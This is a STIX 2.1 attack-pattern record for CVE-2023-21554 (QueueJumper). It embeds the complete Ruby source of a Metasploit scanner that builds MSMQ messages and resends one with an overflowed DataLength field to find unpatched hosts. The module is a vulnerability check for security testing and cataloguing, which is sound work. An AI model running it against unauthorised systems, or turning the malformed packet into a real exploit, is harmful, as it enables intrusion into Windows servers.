{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d159f7b2-5d80-4e1e-a37c-47b6cead02ba",
    "created": "2024-08-14T16:26:34.002956Z",
    "modified": "2024-08-14T16:26:34.00296Z",
    "name": "CVE-2023-21554 - QueueJumper - MSMQ RCE Check",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/msmq/cve_2023_21554_queuejumper.rb",
            "external_id": "cve_2023_21554_queuejumper.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-21554"
        },
        {
            "source_name": "reference",
            "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21554"
        },
        {
            "source_name": "reference",
            "url": "https://securityintelligence.com/posts/msmq-queuejumper-rce-vulnerability-technical-analysis/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'bindata'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'CVE-2023-21554 - QueueJumper - MSMQ RCE Check',\n        'Description' => %q{\n          This module checks the provided hosts for the CVE-2023-21554 vulnerability by sending\n          a MSMQ message with an altered DataLength field within the SRMPEnvelopeHeader that\n          overflows the given buffer. On patched systems, the error is caught and no response\n          is sent back. On vulnerable systems, the integer wraps around and depending on the length\n          could cause an out-of-bounds write. In the context of this module a response is sent back,\n          which indicates that the system is vulnerable.\n        },\n        'Author' => [\n          'Wayne Low', # Vulnerability discovery\n          'Haifei Li', # Vulnerability discovery\n          'Bastian Kanbach <bastian.kanbach@securesystems.de>' # Metasploit Module, @__bka__\n        ],\n        'References' => [\n          [ 'CVE', '2023-21554' ],\n          [ 'URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21554' ],\n          [ 'URL', 'https://securityintelligence.com/posts/msmq-queuejumper-rce-vulnerability-technical-analysis/' ]\n        ],\n        'DisclosureDate' => '2023-04-11',\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION],\n          'AKA' => ['QueueJumper']\n        }\n      )\n    )\n    register_options([\n      Opt::RPORT(1801)\n    ])\n  end\n\n  # Preparing message struct according to https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/f9e71595-339a-4cc4-8341-371e0a4cb232\n\n  class BaseHeader < BinData::Record\n    # BaseHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmq/058cdeb4-7a3c-405b-989c-d32b9d6bddae)\n    #\n    # Simple header containing a static signature, packet size, some flags and some sort of timeout value for the message to arrive\n    #\n\n    endian :big\n\n    uint8 :version_number\n    uint8 :reserved\n    uint16 :flags\n    uint32 :signature\n    uint32le :packet_size\n    uint32le :time_to_reach_queue\n  end\n\n  class UserHeader < BinData::Record\n    # UserHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmq/056b43bc-2466-4342-8504-1630310d5965)\n    #\n    # The UserHeader is an essential header that defines the destination, message id,\n    # source, sent time and expiration time\n    #\n\n    endian :big\n\n    string :source_queue_manager, length: 16\n    string :queue_manager_address, length: 16\n    uint32le :time_to_be_received\n    uint32le :sent_time\n    uint32le :message_id\n    uint32 :flags\n    uint16le :destination_queue_length\n    string :destination_queue\n    string :padding\n  end\n\n  class MessagePropertiesHeader < BinData::Record\n    # MessagePropertiesHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmq/b219bdf4-1bf6-4688-94d8-25fdba45e5ec)\n    #\n    # This header contains meta information about the message like its label,\n    # message size and whether encryption is used.\n    #\n\n    endian :big\n\n    uint8  :flags\n    uint8  :label_length\n    uint16 :message_class\n    string :correlation_id, length: 20\n    uint32 :body_type\n    uint32 :application_tag\n    uint32 :message_size\n    uint32 :allocation_body_size\n    uint32 :privacy_level\n    uint32 :hash_algorithm\n    uint32 :encryption_algorithm\n    uint32 :extension_size\n    string :label\n  end\n\n  class SRMPEnvelopeHeader < BinData::Record\n    # SRMPEnvelopeHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/062b8317-2ade-4b1c-804d-1674b2fdcad3)\n    #\n    # This header contains information about the SOAP envelope of the message.\n    # It includes information about destination queue, label, message and sent\n    # or expiration dates.\n    # The Data field contains a SRMP Message Structure (https://learn.microsoft.com/en-us/openspecs/windows_protocols/mc-mqsrm/38cfc717-c703-46aa-a145-34f60b79399b)\n    #\n\n    endian :big\n\n    uint16  :header_id\n    uint16  :reserved\n    uint32le :data_length\n    string :data\n    string :padding\n  end\n\n  class CompoundMessageHeader < BinData::Record\n    # CompoundMessageHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/ecf70c09-d312-4afc-9e2c-f61a5c827f47)\n    #\n    # This header contains information about the SRMP compound message.\n    # This is basically a HTTP message containing HTTP headers and a SOAP\n    # body that defines parameters like the message destination, sent date,\n    # label and some more.\n    #\n\n    endian :big\n\n    uint16le :header_id\n    uint16 :reserved\n    uint32le :http_body_size\n    uint32le :msg_body_size\n    uint32le :msg_body_offset\n    string :data\n  end\n\n  class ExtensionHeader < BinData::Record\n    #  ExtensionHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/baf230bf-7f15-4d03-bd1d-f8276608a955)\n    #\n    #  Header detailing if any further headers are present. In this case\n    #  no further headers were appended.\n    #\n\n    endian :big\n\n    uint32le :header_size\n    uint32le :remaining_headers_size\n    uint8 :flags\n    string :reserved, length: 3\n  end\n\n  def send_message(msg)\n    connect\n    sock.put(msg)\n    response = sock.timed_read(1024)\n    disconnect\n    return response\n  end\n\n  def run_host(ip)\n    base_header = BaseHeader.new\n\n    # Version number is always 0x10\n    base_header.version_number = 16\n\n    base_header.reserved = 0\n\n    # Flags: PR=3 (Message Priority)\n    base_header.flags = 768\n\n    # Signature is static and always set to 'LIOR'\n    base_header.signature = 0x4C494F52\n\n    # TimeToReachQueue set to 'infinite' (0xFFFFFFFF)\n    base_header.time_to_reach_queue = 4294967295\n\n    user_header = UserHeader.new\n\n    # SourceQueueManager is set to a null UUID, since SRMP Messages use the SOAP Headers for this\n    user_header.source_queue_manager = \"\\x00\" * 16\n\n    # QueueManagerAddress is set to a null UUID, since SRMP Messages use the SOAP Headers for this\n    user_header.queue_manager_address = \"\\x00\" * 16\n\n    user_header.time_to_be_received = 0\n\n    # SentTime is set to an arbitrary value. For this purpose it doesn't matter if it's in the past\n    user_header.sent_time = 1690217059\n\n    user_header.message_id = 1\n\n    # Flags: RC=1, DQ=7 (Direct Format Type), F=1 (MessagePropertiesHeader present), J=1 (HTTP used)\n    user_header.flags = 18620418\n\n    # An arbitrary ip address and queue name was choosen to send the message.\n    # Usually this need to match an existing IP address and queue name, however\n    # for this Proof-of-Concept it doesn't matter what values are used.\n    user_header.destination_queue = \"http://192.168.10.100/msmq/private$/queuejumper\\x00\".encode('utf-16le')\n\n    user_header.destination_queue_length = user_header.destination_queue.length\n    user_header.padding = ''\n    user_header_padding_required = (4 - (user_header.to_binary_s.length % 4)) % 4\n    user_header.padding = \"\\x00\" * user_header_padding_required\n\n    message_properties_header = MessagePropertiesHeader.new\n    message_properties_header.flags = 0\n    message_properties_header.message_class = 0\n    message_properties_header.correlation_id = \"\\x00\" * 20\n    message_properties_header.body_type = 0\n    message_properties_header.application_tag = 0\n\n    # Usually this field contains the size of the message. In SRMP messages this is handles within the SOAP headers\n    message_properties_header.message_size = 0\n\n    message_properties_header.allocation_body_size = 0\n    message_properties_header.privacy_level = 0\n    message_properties_header.hash_algorithm = 0\n    message_properties_header.encryption_algorithm = 0\n    message_properties_header.extension_size = 0\n\n    # Label of the message was set to the arbitrary value 'poc'\n    message_properties_header.label = \"poc\\x00\".encode('utf-16le')\n\n    message_properties_header.label_length = message_properties_header.label.length / 2\n\n    srmp_envelope_header = SRMPEnvelopeHeader.new\n    srmp_envelope_header.header_id = 0\n    srmp_envelope_header.reserved = 0\n\n    # The payload within the SRMPEnvelopeHeader structure is a SOAP request that defines message label, destination queue\n    # and expiry and sent dates.\n    # Usually the destination information need to match the IP address and queue name, however\n    # for this Proof-of-Concept it doesn't matter what values are used.\n    srmp_envelope_header.data = <<~EOF.chomp\n      <se:Envelope xmlns:se=\"http://schemas.xmlsoap.org/soap/envelope/\" \\r\n      xmlns=\"http://schemas.xmlsoap.org/srmp/\">\\r\n      <se:Header>\\r\n       <path xmlns=\"http://schemas.xmlsoap.org/rp/\" se:mustUnderstand=\"1\">\\r\n         <action>MSMQ:poc</action>\\r\n         <to>http://192.168.10.100/msmq/private$/queuejumper</to>\\r\n         <id>uuid:1@00000000-0000-0000-0000-000000000000</id>\\r\n       </path>\\r\n       <properties se:mustUnderstand=\"1\">\\r\n         <expiresAt>20600609T164419</expiresAt>\\r\n         <sentAt>20230724T164419</sentAt>\\r\n       </properties>\\r\n      </se:Header>\\r\n      <se:Body></se:Body>\\r\n      </se:Envelope>\\r\\n\\r\\n\\x00\n    EOF\n\n    srmp_envelope_header.data = srmp_envelope_header.data.encode('utf-16le')\n    srmp_envelope_header.data_length = srmp_envelope_header.data.length / 2\n    srmp_envelope_header_padding_required = (4 - (srmp_envelope_header.to_binary_s.length % 4)) % 4\n    srmp_envelope_header.padding = \"\\x00\" * srmp_envelope_header_padding_required\n\n    compound_message_header = CompoundMessageHeader.new\n\n    # HeaderId is set to an arbitrary value\n    compound_message_header.header_id = 500\n\n    compound_message_header.reserved = 0\n\n    # MsgBodySize denotes the size of the actual message\n    compound_message_header.msg_body_size = 7\n\n    # MsgBodyOffset is the offset of the actual message within the CompoundMessageHeader payload\n    compound_message_header.msg_body_offset = 995\n\n    # The data field within the CompoundMessageHeader structure contains a HTTP-POST request that is used to submit the message\n    # to MSMQ. It contains the destination host, the SOAP envelope from SRMPEnvelopeHeader, sent and expiry dates. The destination\n    # addresses and queue names don't need to match for this proof-of-concept to work. With incorrect information the message will\n    # never reach the destination, however parsing of the structure and triggering the vulnerable code sequence happens before anyway.\n    compound_message_header.data = <<~EOF.chomp\n      POST /msmq HTTP/1.1\\r\n      Content-Length: 816\\r\n      Content-Type: multipart/related; boundary=\"MSMQ - SOAP boundary, 53287\"; type=text/xml\\r\n      Host: 192.168.10.100\\r\n      SOAPAction: \"MSMQMessage\"\\r\n      Proxy-Accept: NonInteractiveClient\\r\n      \\r\n      --MSMQ - SOAP boundary, 53287\\r\n      Content-Type: text/xml; charset=UTF-8\\r\n      Content-Length: 606\\r\n      \\r\n      <se:Envelope xmlns:se=\"http://schemas.xmlsoap.org/soap/envelope/\" \\r\n      xmlns=\"http://schemas.xmlsoap.org/srmp/\">\\r\n      <se:Header>\\r\n       <path xmlns=\"http://schemas.xmlsoap.org/rp/\" se:mustUnderstand=\"1\">\\r\n         <action>MSMQ:poc</action>\\r\n         <to>http://192.168.10.100/msmq/private$/queuejumper</to>\\r\n         <id>uuid:1@00000000-0000-0000-0000-000000000000</id>\\r\n       </path>\\r\n       <properties se:mustUnderstand=\"1\">\\r\n         <expiresAt>20600609T164419</expiresAt>\\r\n         <sentAt>20230724T164419</sentAt>\\r\n       </properties>\\r\n      </se:Header>\\r\n      <se:Body></se:Body>\\r\n      </se:Envelope>\\r\n      \\r\n      --MSMQ - SOAP boundary, 53287\\r\n      Content-Type: application/octet-stream\\r\n      Content-Length: 7\\r\n      Content-Id: body@ff3af301-3196-497a-a918-72147c871a13\\r\n      \\r\n      Message\\r\n      --MSMQ - SOAP boundary, 53287--\\x00\n    EOF\n    compound_message_header.http_body_size = compound_message_header.data.length\n\n    extension_header = ExtensionHeader.new\n\n    # Extension header will be empty in this case. The length is set to the minimal value of 12.\n    extension_header.header_size = 12\n\n    extension_header.remaining_headers_size = 0\n    extension_header.flags = 0\n    extension_header.reserved = \"\\x00\" * 3\n\n    # Total packet size within the BaseHeader is calculated, now that all message parts were instantiated\n    base_header.packet_size = base_header.to_binary_s.length + user_header.to_binary_s.length + message_properties_header.to_binary_s.length + srmp_envelope_header.to_binary_s.length + compound_message_header.to_binary_s.length + extension_header.to_binary_s.length\n\n    # A normal message is sent to the server. This should yield a result for both, vulnerable and patched MSMQ instances\n    response = send_message(base_header.to_binary_s + user_header.to_binary_s + message_properties_header.to_binary_s + srmp_envelope_header.to_binary_s + compound_message_header.to_binary_s + extension_header.to_binary_s)\n\n    if !response\n      print_error('No response received due to a timeout')\n      return\n    end\n\n    if response.include?('LIOR')\n      # Response from server contains the static signature value 'LIOR'. Presence of MSMQ is confirmed\n      print_status('MSMQ detected. Checking for CVE-2023-21554')\n    else\n      print_error('Service does not look like MSMQ')\n      return\n    end\n\n    # This statement increases the DataLength field within the SRMPEnvelopeHeader by 0x80000000. This will cause\n    # an integer overflow, that overflows the 4 integer bytes. By adding this value the least significant 4 bytes will\n    # remain the same, to ensure that a vulnerable MSMQ instance doesn't try to access invalid memory. This means that\n    # vulnerable instances are expected to sent a normal response, like for the first, unmodified packet.\n    #\n    # Patched instances will detect the overflow, throw an exception and stop processing the message. No response is expected.\n    srmp_envelope_header.data_length = srmp_envelope_header.data_length + 2147483648\n\n    response = send_message(base_header.to_binary_s + user_header.to_binary_s + message_properties_header.to_binary_s + srmp_envelope_header.to_binary_s + compound_message_header.to_binary_s + extension_header.to_binary_s)\n\n    if response.nil?\n      print_error('No response received, MSMQ seems to be patched')\n      return\n    end\n\n    if response.include?('LIOR')\n      print_good('MSMQ vulnerable to CVE-2023-21554 - QueueJumper!')\n\n      # Add Report\n      report_vuln(\n        host: ip,\n        port: rport,\n        proto: 'tcp',\n        name: name,\n        info: 'Missing Microsoft Windows patch for CVE-2023-21554',\n        refs: references\n      )\n\n    else\n      print_error('Unknown response detected upon sending a malformed message. MSMQ might be vulnerable, but the behaviour is unusual')\n    end\n  rescue ::Rex::ConnectionError\n    print_error('Unable to connect to the service')\n  rescue ::Errno::ECONNRESET\n    print_error('Connection reset by service')\n  rescue ::Errno::EPIPE\n    print_error('pipe error')\n  rescue Timeout::Error\n    print_error('Timeout after waiting for service to respond')\n  rescue StandardError => e\n    print_error(e)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-04-11"
}